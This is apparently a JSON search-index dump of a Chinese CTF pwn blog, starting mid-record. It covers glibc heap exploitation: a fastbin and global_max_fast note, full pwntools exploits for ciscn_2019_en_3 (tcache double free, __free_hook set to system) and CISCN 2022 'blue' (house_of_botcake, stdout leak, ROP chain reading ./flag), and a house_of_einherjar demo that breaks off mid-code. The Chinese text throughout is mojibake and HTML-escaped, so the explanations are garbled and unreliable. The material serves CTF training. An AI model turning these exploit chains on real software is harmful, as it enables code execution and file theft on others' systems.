&lt;initial+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcedb0 &lt;initial+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcedc0 &lt;initial+64&gt;:\t0x0000000000000000\t0x0000000000000000\nä¼ªé€ çš„fastbinçš„addrä¸º0x7ffff7dced90å½“ç¨‹åºå¯ä»¥åœ¨è¯¥ä½ç½®ç”³è¯·chunkçš„æ—¶å€™ï¼Œé€šè¿‡é‡å¤å‘top_chunkç”³è¯·æœ€ç»ˆè¦†å†™__free_hookçš„å€¼ä¸ºsystemçš„å€¼é€šè¿‡free &#x2F;bin&#x2F;sh\\x00çš„chunk,è¾¾åˆ°ç¨‹åºæµåŠ«æŒgetshellã€‚\nä¿®æ”¹global_max_fasté€šè¿‡fastbin attack ä½¿å¾—å¯ä»¥ç”³è¯·æŒ‡å®šå¤§å°çš„ï¼ŒåŒ…å«free_hookçš„chunkï¼Œæ¯”å¦‚åˆ©ç”¨0x7ffff7dced98å¤„çš„å€¼ï¼Œä½†æ˜¯è¿™é‡Œè¦åˆç†å»æ„é€ åç§»\npwndbg&gt; x/50gx 0x7ffff7dcf8e8-0xC000x7ffff7dcece8 &lt;lock.10026+8&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcecf8 &lt;maxmap&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced08 &lt;string_space_max&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced18 &lt;lock&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced28:\t0x0000000000000000\t0x00000000000000000x7ffff7dced38 &lt;lock+8&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced48 &lt;phys_pages.8062&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced58 &lt;last_environ&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced68 &lt;envlock&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced78:\t0x0000000000000000\t0x00000000000000000x7ffff7dced88 &lt;initial+8&gt;:\t0x0000000000000001\t0x00000000000000040x7ffff7dced98 &lt;initial+24&gt;:\t0x05fc5621ed6fad69\t0x0000000000000000......\n\nçœ‹ä¸ªä¾‹é¢˜8~ciscn_2019_en_3\n[*] &#x27;~/ciscn_2019_en_3&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled```\nç¨‹åºåªå®ç°äº†addå’Œdeletemainå‡½æ•°é‡Œçš„_printf_chkèƒ½æ³„éœ²libcåœ°å€\nputs(&quot;What&#x27;s your name?&quot;);read(0, buf, 0x20uLL);_printf_chk(1LL, buf);puts(&quot;Please input your ID.&quot;);read(0, s, 8uLL);puts(s);\n_printf_chkæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°0x1ä»£è¡¨ä¿æŠ¤çº§åˆ«å­˜å…¥å¯„å­˜å™¨rdiï¼Œç¬¬äºŒä¸ªå‚æ•°æ‰æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ ¼å¼åŒ–åˆ©ç”¨å­—ç¬¦ä¸²%p-%p-%på­˜å…¥å¯„å­˜å™¨rsiã€‚åŠ¨è°ƒå‘ç°å¯„å­˜å™¨rcxå­˜æ”¾çš„æ˜¯read+17çš„åœ°å€æ ¹æ®64ä½linuxä¸‹å‰6ä¸ªå¯„å­˜å™¨ä¼ å‚çš„ä¹ æƒ¯ï¼ˆrdi&#x2F;rsi&#x2F;rdx&#x2F;rcx&#x2F;r8&#x2F;r9ï¼‰æ­¤å¤„å·²ç»ç”¨äº†ä¸¤ä¸ªå¯„å­˜å™¨ã€‚æ‰€ä»¥ç¬¬äºŒä¸ª%på°†ä¼šæ‰“å°å‡ºrcxå­˜æ”¾çš„å€¼ã€‚\nRCX  0x7ffff7af2031 (read+17) â—‚â€” cmp rax, -0x1000 /* &#x27;H=&#x27; */RDX  0x20RDI  0x1RSI  0x7fffffffe2a0 â—‚â€” 0xa61616161 /* &#x27;aaaa\\n&#x27; */R8   0x11R9   0x7ffff7fe1500 â—‚â€” 0x7ffff7fe1500\nadd\nunsigned __int64 sub_BE9()&#123;  int v0; // ebx  int v2; // [rsp+4h] [rbp-1Ch] BYREF  unsigned __int64 v3; // [rsp+8h] [rbp-18h]  v3 = __readfsqword(0x28u);  if ( dword_20204C &gt; 16 )    puts(&quot;Enough!&quot;);  puts(&quot;Please input the size of story: &quot;);  _isoc99_scanf(&quot;%d&quot;, &amp;v2);  *((_DWORD *)&amp;unk_202060 + 4 * dword_20204C) = v2;  v0 = dword_20204C;  *((_QWORD *)&amp;unk_202068 + 2 * v0) = malloc(v2);  puts(&quot;please inpute the story: &quot;);  read(0, *((void **)&amp;unk_202068 + 2 * dword_20204C), v2);  ++dword_20204C;  puts(&quot;Done!&quot;);  return __readfsqword(0x28u) ^ v3;&#125;\ndeleteå­˜åœ¨UAF\nunsigned __int64 sub_D32()&#123;  int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;Please input the index:&quot;);  _isoc99_scanf(&quot;%d&quot;, &amp;v1);  free(*((void **)&amp;unk_202068 + 2 * v1));  puts(&quot;Done!&quot;);  return __readfsqword(0x28u) ^ v2;&#125;\næ‰“one_gadgetæ²¡ç©¿\nâ””â”€$ one_gadget libc-2.27.so0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  rsp &amp; 0xf == 0  rcx == NULL0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\næœ€åæ‰“çš„æ˜¯å°†free_hookæ”¹ä¸ºsystemï¼Œç¬¬äºŒä¸ªå †å—å†™â€™&#x2F;bin&#x2F;sh\\x00â€™\n[+] read        : 0x7f8e125b6070[+] libc_base   : 0x7f8e124a6000[+] sys_addr    : 0x7f8e124f5440[+] one_gadget  : 0xff1c2499b322[+] malloc_hook : 0x7f8e12891c30[+] free_hook   : 0x7f8e128938e8\nexp:\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)libc = ELF(&#x27;libc-2.27.so&#x27;)elf = ELF(&#x27;./ciscn_2019_en_3&#x27;)#p = process(&#x27;./ciscn_2019_en_3&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,29868)def add(size,buf):\tp.recvuntil(&quot;Input your choice:&quot;)\tp.sendline(str(1))\tp.recvuntil(&quot;Please input the size of story: \\n&quot;)\tp.sendline(str(size))\tp.recvuntil(&quot;please inpute the story: \\n&quot;)\tp.sendline(buf)def free(idx):\tp.recvuntil(&quot;Input your choice:&quot;)\tp.sendline(str(4))\tp.recvuntil(&quot;Please input the index:\\n&quot;)\tp.sendline(str(idx))one_gadget = 0x4f322p.recvuntil(&quot;What&#x27;s your name?\\n&quot;)p.sendline(b&quot;%p-%p-%p&quot;)p.recvuntil(&quot;-&quot;)info = p.recvuntil(&quot;-&quot;, drop=True)info = int(info.decode(&quot;ISO-8859-1&quot;), 16)-17read = libc.sym[&quot;read&quot;]libc_base = info-readsys_addr = libc_base + libc.sym[&#x27;system&#x27;]one_gadget = libc_base + 0x4f322malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]one_gadget = libc_base + one_gadgetp.recvuntil(&quot;Please input your ID.\\n&quot;)p.send(&quot;a&quot;)# alloc to libcadd(0x20, &quot;a&quot;)  # 0free(0)free(0)#double_free chunk0add(0x20, p64(free_hook))   # 1add(0x20, &quot;/bin/sh\\x00&quot;) # 2add(0x20, p64(sys_addr))#pause()free(1)#gdb.attach(p)success(&quot;read        : &quot; + hex(info))success(&quot;libc_base   : &quot; + hex(libc_base))success(&quot;sys_addr    : &quot; + hex(sys_addr))success(&quot;one_gadget  : &quot; + hex(one_gadget))success(&quot;malloc_hook : &quot; + hex(malloc_hook))success(&quot;free_hook   : &quot; + hex(free_hook))p.interactive()","categories":["heap"],"tags":["hook"]},{"title":"house_of_botcake","url":"/2023/11/11/house-of-botcake/","content":"glibcé«˜ç‰ˆæœ¬2.27ä¹‹åï¼Œç®€å•çš„tcache bin double freeä¸èƒ½å®ç°å› ä¸ºå¼•å…¥äº†å¯¹tcache keyçš„æ£€æŸ¥å¦‚ä¸‹ï¼š\nsize_t tc_idx = csize2tidx (size);if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)  &#123;/* Check to see if it&#x27;s already in the tcache.  */tcache_entry *e = (tcache_entry *) chunk2mem (p);&#125;/* This test succeeds on double free.  However, we don&#x27;t 100%   trust it (it also matches random payload data at a 1 in   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely   coincidence before aborting.  */if (__glibc_unlikely (e-&gt;key == tcache))  &#123;tcache_entry *tmp;LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)  if (tmp == e)malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);/* If we get here, it was a coincidence.  We&#x27;ve wasted a   few cycles, but don&#x27;t abort.  */  &#125;\nå½“ free æ‰ä¸€ä¸ªå †å—è¿›å…¥ tcache æ—¶å‡å¦‚å †å—çš„ bk ä½å­˜æ”¾çš„ key &#x3D;&#x3D; tcache_keyå°±ä¼šéå†è¿™ä¸ªå¤§å°çš„ Tcacheï¼Œå‡å¦‚å‘ç°åŒåœ°å€çš„å †å—ï¼Œåˆ™è§¦å‘ Double Free æŠ¥é”™ã€‚\nä»¥ä¸‹ç¨‹åºæ¥è‡ªhow2heap\n//gcc botcake.c -g  -o botcake //gcc 2heap.c -g -no-pie -no-stack-protector -o heap2stack #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);//ä¸è®©_IO_FILEå¹²æ¶‰æˆ‘ä»¬çš„å †å—    // prepare the target    intptr_t stack_var[4];    printf(&quot;the target address is %p.\\n\\n&quot;, stack_var);    intptr_t *x[7];    for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++)&#123;        x[i] = malloc(0x100);    &#125;//å‡†å¤‡å¡æ»¡tcache    puts(&quot;Allocating a chunk for later consolidation&quot;);    intptr_t *prev = malloc(0x100);//prev    puts(&quot;Allocating the victim chunk.&quot;);    intptr_t *a = malloc(0x100);//victim    printf(&quot;malloc(0x100): a=%p.\\n&quot;, a);       malloc(0x10);//é˜²æ­¢åˆå¹¶     for(int i=0; i&lt;7; i++)&#123;        free(x[i]);    &#125;//å¡«æ»¡tcache    free(a);//victim 2 unsortedbin        free(prev);//freeæ‰prev ä½¿å…¶ä¸victimåˆå¹¶        //ç”³è¯·å‡ºä¸€ä¸ªå †å—ï¼Œæ­¤æ—¶ä¼šä¼˜å…ˆä» Tcache ä¸­å–å‡ºä¸€ä¸ªå¡«å……å †å—è…¾å‡ºä½ç½®ã€‚ç„¶åå† Free æ‰ victim ï¼Œvictim è¿›å…¥ Tcacheï¼Œå®Œæˆ Double Free    malloc(0x100);    /*VULNERABILITY*/    free(a);// a is already freed    /*VULNERABILITY*/    //æ­¤æ—¶é€ æˆå †é‡å ï¼Œä¸€ä¸ªå¤§çš„unsortedbinåŒ…å«ä¸€ä¸ªå°çš„tcachebin    //ç”³è¯·ä¸€ä¸ªæ¯”victimå¤§çš„å †å—ï¼Œå¯ä»¥ç¯¡æ”¹victimçš„fwdï¼ˆnextï¼‰æŒ‡é’ˆ    intptr_t *b = malloc(0x120);    b[0x120/8-2] = (long)stack_var;        // take target out    puts(&quot;Now we can cash out the target chunk.&quot;);    malloc(0x100);    intptr_t *c = malloc(0x100);    printf(&quot;The new chunk is at %p\\n&quot;, c);        // sanity check    assert(c==stack_var);    printf(&quot;Got control on target/stack!\\n\\n&quot;);        //å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸€æ¬¡ç¯¡æ”¹è¿‡åï¼Œæˆ‘ä»¬å¯ä»¥freeæ‰victimå’Œæ‰§è¡Œç¯¡æ”¹çš„å †å—ï¼Œå†æ¬¡ç”³è¯·æ‰§è¡Œç¯¡æ”¹çš„å †å—å³å¯å†æ¬¡ç¯¡æ”¹victimçš„nextæŒ‡é’ˆï¼Œå¤šæ¬¡è¿›è¡ŒTcache Poinsoning    return 0;&#125;\nè¿è¡Œç»“æœå®é™…ä½¿ç”¨çœ‹ä¾‹é¢˜\n[CISCN 2022 åä¸œåŒ—]blueä¸€é”®å››è¿check,æ¯æ¬¡è¿›menuå‰éƒ½ä¼šæ£€æŸ¥malloc_hook free_hookæœ‰æ²¡æœ‰è¢«åŠ«æŒæ£€æŸ¥ä¸é€šè¿‡å°±ä¼šè°ƒç”¨_exitï¼ˆä¸èƒ½ç”¨exit_hookåŠ«æŒï¼‰addé™åˆ¶size &lt;&#x3D;0x90delæ˜¯ä¸€ä¸ªæ­£å¸¸çš„deleteï¼Œæ— UAFshowä»…å¯ä»¥è°ƒç”¨ä¸€æ¬¡è¾“å…¥666å¯ä»¥è¿›å…¥ä»…æœ‰ä¸€æ¬¡çš„UAF\n#prepare house of botcake for i in range(9):    add(0x80, b&#x27;aa&#x27;)add(0x80, b&#x27;aa&#x27;)for i in range(7):    delete(i)magic(8)#show(8)delete(7)add(0x80, b&#x27;aa&#x27;) #0delete(8)#unsortedbin åˆå¹¶add(0x70, b&#x27;bb&#x27;) #1  åˆ†å‰²unsortedbin\nå‡†å¤‡house_of_botcakeï¼ˆæ­¤å¤„å¿½ç•¥leak_libc_baseï¼‰\nstdout = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]p1 = p64(0) + p64(0x91) + p64(stdout) #hijack stdoutadd(0x70, p1) # 2 overlappingadd(0x80, b&#x27;cc&#x27;) # 3\nåˆ©ç”¨å †é‡å ï¼Œå°†å †å—åˆ†é…åˆ°stdoutå¤„ï¼Œæ­¤æ—¶çš„å †ç»“æ„ï¼Œä¸‰ä¸ªå †å—å å ä¹\nenviron = libc_base + libc.sym[&#x27;environ&#x27;]p2 = p64(0xfbad1800) + p64(0) * 3 + p64(environ) + p64(environ + 8) * 2 #stdout -&gt; environ leak stack_addradd(0x80, p2)   #4stack_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x128#addè¿”å›çš„åœ°å€\nå€ŸåŠ©stdoutæ³„éœ²environä¸­çš„æ ˆåœ°å€ï¼Œä»¥æ­¤è·å¾—addçš„retåœ°å€è¿™ä¸¤æ­¥å®é™…ä¸Šæ˜¯è¦†å†™äº†stdoutä¸­çš„flagsæ ‡å¿—ï¼ˆç»•è¿‡æ£€æŸ¥ï¼‰ï¼Œä»¥åŠå°†write_baseå’Œwrite_ptr &amp; write_endæ”¹æˆenvironå’Œenviron + 8\ndelete(3)delete(2)p3 = p64(0) + p64(0x91) + p64(stack_addr) #å†æ¬¡ä»»æ„ç”³è¯·ç”³è¯·åˆ°æ ˆä¸Šadd(0x70, p3)#2add(0x80, &#x27;dd&#x27;) #3\nå†æ‰“ä¸€æ¬¡tcache poisoningï¼ŒæŠŠä¸‹ä¸€ä¸ªå †å—åˆ†é…åˆ°æ ˆä¸Š\np4 = b&#x27;./flag\\x00\\x00&#x27;# open(&#x27;./flag&#x27;, 0)p4 += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)# read(3, stack_addr + 0x200, 0x50)p4 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(stack_addr + 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(read_addr)# puts(stack_addr + 0x200)p4 += p64(pop_rdi_ret) + p64(stack_addr + 0x200) + p64(puts_addr)add(0x80, p4)#ret2stackï¼ˆç¡®å®ï¼‰\nåœ¨æ ˆä¸Šå¸ƒç½®orwçš„ropchainï¼Œç”±äºaddçš„retåœ°å€å·²ç»é­åˆ°ç¯¡æ”¹ï¼Œretçš„æ—¶å€™ä¼šç›´æ¥è·³åˆ°æ ˆä¸Šæ‰§è¡Œropchainæœ¬åœ°æ‰“é€šï¼š\nfrom pwn import*from pwn import p64,u64#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28672)p = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size,payload):    p.recvuntil(&#x27;Choice: &#x27;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&#x27;Please input size: &#x27;)    p.sendline(str(size))    p.recvuntil(b&#x27;Please input content: &#x27;)    p.send(payload)def delete(index):    p.recvuntil(&quot;Choice: &quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;Please input idx: &#x27;)    p.sendline(str(index))def show(index):    p.recvuntil(&quot;Choice: &quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;Please input idx: &quot;)    p.sendline(str(index))def magic(index):    p.recvuntil(&quot;Choice: &quot;)    p.sendline(b&#x27;666&#x27;)    p.recvuntil(b&quot;Please input idx: &quot;)#one_UAF_chance    p.sendline(str(index))#prepare house of botcake &amp;&amp; leak libc basefor i in range(9):    add(0x80, b&#x27;aa&#x27;)add(0x80, b&#x27;aa&#x27;)for i in range(7):    delete(i)magic(8)show(8)show_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))success(&#x27;show_addr = &#x27; + hex(show_addr))libc_base = show_addr - 0x1ecbe0stdout = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]success(&#x27;stdout = &#x27; + hex(stdout))environ = libc_base + libc.sym[&#x27;environ&#x27;]success(&#x27;environ = &#x27; + hex(environ))delete(7)add(0x80, b&#x27;aa&#x27;) #0delete(8)#unsortedbin åˆå¹¶add(0x70, b&#x27;bb&#x27;) #1  åˆ†å‰²unsortedbinp1 = p64(0) + p64(0x91) + p64(stdout) #hijack stdoutadd(0x70, p1) # 2 overlappingadd(0x80, b&#x27;cc&#x27;) # 3debug()p2 = p64(0xfbad1800) + p64(0) * 3 + p64(environ) + p64(environ + 8) * 2 #stdout -&gt; environ leak stack_addradd(0x80, p2)   #4stack_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x128#addè¿”å›çš„åœ°å€success(&#x27;stack_addr = &#x27; + hex(stack_addr))delete(3)delete(2)p3 = p64(0) + p64(0x91) + p64(stack_addr) #å†æ¬¡ä»»æ„ç”³è¯·ç”³è¯·åˆ°æ ˆä¸Šadd(0x70, p3)#2add(0x80, &#x27;dd&#x27;) #3read_addr = libc_base + libc.sym[&#x27;read&#x27;]open_addr = libc_base + libc.sym[&#x27;open&#x27;]write_addr = libc_base + libc.sym[&#x27;write&#x27;]pop_rdi_ret = libc_base + 0x0000000000023b6apop_rsi_ret = libc_base + 0x000000000002601fpop_rdx_ret = libc_base + 0x0000000000142c92flag_addr = stack_addrp4 = b&#x27;./flag\\x00\\x00&#x27;# open(&#x27;./flag&#x27;, 0)p4 += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)# read(3, stack_addr + 0x200, 0x50)p4 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(stack_addr + 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(read_addr)# puts(stack_addr + 0x200)puts_addr = libc_base + libc.sym[&#x27;puts&#x27;]p4 += p64(pop_rdi_ret) + p64(stack_addr + 0x200) + p64(puts_addr)add(0x80, p4)#ret2stackï¼ˆç¡®å®ï¼‰p.interactive()","categories":["heap"],"tags":["bin"]},{"title":"house_of_einherjar","url":"/2023/10/10/house-of-einherjar/","content":"æ¥ç©æŠŠç¥–ç›å§åˆ©ç”¨çš„æ˜¯freeçš„åå‘åˆå¹¶\nfreeå‡½æ•°åå‘åˆå¹¶å…³é”®ä»£ç \n/*consolidate backward*/if (!prev_inuse(p))&#123;//åˆ¤æ–­è¢«é‡Šæ”¾å †å—pçš„inuseæ ‡å¿—ä½æ˜¯å¦ä¸º0ï¼Œå¦‚æœä¸º0åˆ™è¿›è¡Œifä¸­çš„å†…å®¹ï¼Œç›¸å½“äºä¸€ä¸ªæ£€æŸ¥ã€‚é€šè¿‡è¿™ä¸ªç‚¹è¯´æ˜æˆ‘ä»¬è‡³å°‘è¦é€šè¿‡å †æº¢å‡ºå»è¦†ç›–æ‰ç›¸é‚»é«˜åœ°å€ä½çš„inuseæ ‡å¿—ä½ï¼Œæœ€å¸¸è§çš„æ–¹å¼å°±æ˜¯off-by-one    prevsize p-&gt;prev size;//è®°å½•ç›¸é‚»å †å—pçš„prev_sizeå€¼    size += prev_size;//sizeä¸ºsize + prev_size    p = chunk_at_offset(p,-((long)prevsize));//å †å—pçš„æŒ‡é’ˆæœ€åç”±chunk_at_offset()å‡½æ•°å†³å®šï¼Œchunk_at_offset()å‡½æ•°å¦‚ä¸‹å›¾ï¼Œä½œç”¨æ˜¯å°†åŸæœ¬pæŒ‡é’ˆä½ç½®åŠ ä¸Šsåç§»åçš„ä½ç½®ä½œä¸ºåˆå¹¶å †å—çš„æ–°æŒ‡é’ˆã€‚é‚£ä¹ˆå¸¦å›åˆ°freeå‡½æ•°ä¸­ï¼Œæ„æ€å°±æ˜¯åŸæœ¬pæŒ‡é’ˆéœ€è¦å‡å»ï¼ˆå‘åï¼‰ä¸€ä¸ªåå‘å †å—sizeï¼ˆp-&gt;prev_sizeï¼‰å¤§å°çš„åç§»åå¾—åˆ°åˆå¹¶å †å—çš„æ–°æŒ‡é’ˆ    unlink(av, p, bck, fwd);//unlinkæ£€æŸ¥&#125;\ndebugç¨‹åºæ¥è‡ªhow2heapè¿˜æ˜¯æ”¾ä¸ªåŸç¨‹åºåœ¨è¿™å§\n//gcc house_of_einherjar.c -g -o einherjar#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;/*   Credit to st4g3r for publishing this technique   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. */int main()&#123;\tsetbuf(stdin, NULL);\tsetbuf(stdout, NULL);\tprintf(&quot;Welcome to House of Einherjar!\\n&quot;);\tprintf(&quot;Tested in Ubuntu 18.04.4 64bit.\\n&quot;);\tprintf(&quot;This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.\\n&quot;);\tprintf(&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\\n&quot;);\tuint8_t* a;\tuint8_t* b;\tuint8_t* d;\tprintf(&quot;\\nWe allocate 0x38 bytes for &#x27;a&#x27;\\n&quot;);\ta = (uint8_t*) malloc(0x38);\tprintf(&quot;a: %p\\n&quot;, a);   \tint real_a_size = malloc_usable_size(a);\tprintf(&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\\n&quot;, real_a_size);\t// create a fake chunk\tprintf(&quot;\\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\\n&quot;);\tprintf(&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\\n&quot;);\tprintf(&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\\n&quot;);\tprintf(&quot;(although we could do the unsafe unlink technique here in some scenarios)\\n&quot;);\tsize_t fake_chunk[6];\tfake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size\tfake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin\tfake_chunk[2] = (size_t) fake_chunk; // fwd\tfake_chunk[3] = (size_t) fake_chunk; // bck\tfake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize\tfake_chunk[5] = (size_t) fake_chunk; //bck_nextsize\tprintf(&quot;Our fake chunk at %p looks like:\\n&quot;, fake_chunk);\tprintf(&quot;prev_size (not used): %#lx\\n&quot;, fake_chunk[0]);\tprintf(&quot;size: %#lx\\n&quot;, fake_chunk[1]);\tprintf(&quot;fwd: %#lx\\n&quot;, fake_chunk[2]);\tprintf(&quot;bck: %#lx\\n&quot;, fake_chunk[3]);\tprintf(&quot;fwd_nextsize: %#lx\\n&quot;, fake_chunk[4]);\tprintf(&quot;bck_nextsize: %#lx\\n&quot;, fake_chunk[5]);\t/* In this case it is easier if the chunk size attribute has a least significant byte with\t * a value of 0x00. The least significant byte of this will be 0x00, because the size of \t * the chunk includes the amount requested plus some amount required for the metadata. */\tb = (uint8_t*) malloc(0x4f8);\tint real_b_size = malloc_usable_size(b);\tprintf(&quot;\\nWe allocate 0x4f8 bytes for &#x27;b&#x27;.\\n&quot;);\tprintf(&quot;b: %p\\n&quot;, b);\tuint64_t* b_size_ptr = (uint64_t*)(b - 8);\t/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/\tprintf(&quot;\\nb.size: %#lx\\n&quot;, *b_size_ptr);\tprintf(&quot;b.size is: (0x500) | prev_inuse = 0x501\\n&quot;);\tprintf(&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\\n&quot;);\t/* VULNERABILITY */\ta[real_a_size] = 0; \t/* VULNERABILITY */\tprintf(&quot;b.size: %#lx\\n&quot;, *b_size_ptr);\tprintf(&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;\t\t   &quot;don&#x27;t change the size of b, only its prev_inuse bit\\n&quot;);\tprintf(&quot;If it had been modified, we would need a fake chunk inside &quot;\t\t   &quot;b where it will try to consolidate the next chunk\\n&quot;);\t// Write a fake prev_size to the end of a\tprintf(&quot;\\nWe write a fake prev_size to the last %lu bytes of a so that &quot;\t\t   &quot;it will consolidate with our fake chunk\\n&quot;, sizeof(size_t));\tsize_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);\tprintf(&quot;Our fake prev_size will be %p - %p = %#lx\\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size);\t*(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;\t//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size\tprintf(&quot;\\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\\n&quot;);\tfake_chunk[1] = fake_size;\t// free b and it will consolidate with our fake chunk\tprintf(&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\\n&quot;);\tfree(b);\tprintf(&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n&quot;, fake_chunk[1]);\t//if we allocate another chunk before we free b we will need to \t//do two things: \t//1) We will need to adjust the size of our fake chunk so that\t//fake_chunk + fake_chunk&#x27;s size points to an area we control\t//2) we will need to write the size of our fake chunk\t//at the location we control. \t//After doing these two things, when unlink gets called, our fake chunk will\t//pass the size(P) == prev_size(next_chunk(P)) test. \t//otherwise we need to make sure that our fake chunk is up against the\t//wilderness\t//\tprintf(&quot;\\nNow we can call malloc() and it will begin in our fake chunk\\n&quot;);\td = malloc(0x200);\tprintf(&quot;Next malloc(0x200) is at %p\\n&quot;, d);\tassert((long)d == (long)&amp;fake_chunk[2]);&#125;\næˆ‘å»é™¤äº†å¤§éƒ¨åˆ†çš„è‹±æ–‡ä½†ä¿ç•™äº†æ¼æ´åˆ©ç”¨è¿™æ ·æ‰çŸ¥é“æ‰“çš„æ˜¯house_of_einherjar(doge)å…¶å®æ˜¯æ–¹ä¾¿è°ƒè¯•å¦‚ä¸‹:\n//gcc house_of_einherjar.c -g -o einherjar#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;int main()&#123;\tsetbuf(stdin, NULL);\tsetbuf(stdout, NULL);\tuint8_t* a;\tuint8_t* b;\tuint8_t* d;\t//create 0x48(0x38+0x10)size chunka \ta = (uint8_t*) malloc(0x38);\tprintf(&quot;a: %p\\n&quot;, a);   \tint real_a_size = malloc_usable_size(a);\tprintf(&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\\n&quot;, real_a_size);\t// create a fake chunk\tsize_t fake_chunk[6];\tfake_chunk[0] = 0x100; \tfake_chunk[1] = 0x100; \tfake_chunk[2] = (size_t) fake_chunk; \tfake_chunk[3] = (size_t) fake_chunk; \tfake_chunk[4] = (size_t) fake_chunk; \tfake_chunk[5] = (size_t) fake_chunk; \t//create 0x508(0x4f8+0x10) chunkb \tb = (uint8_t*) malloc(0x4f8);\tint real_b_size = malloc_usable_size(b);\tuint64_t* b_size_ptr = (uint64_t*)(b - 8);\tprintf(&quot;\\nb.size: %#lx\\n&quot;, *b_size_ptr);\ta[real_a_size] = 0; \tprintf(&quot;b.size: %#lx\\n&quot;, *b_size_ptr);\tsize_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);\tprintf(&quot;Our fake prev_size will be %p - %p = %#lx\\n&quot;, b-sizeof(size_t)*2, fake_chunk, 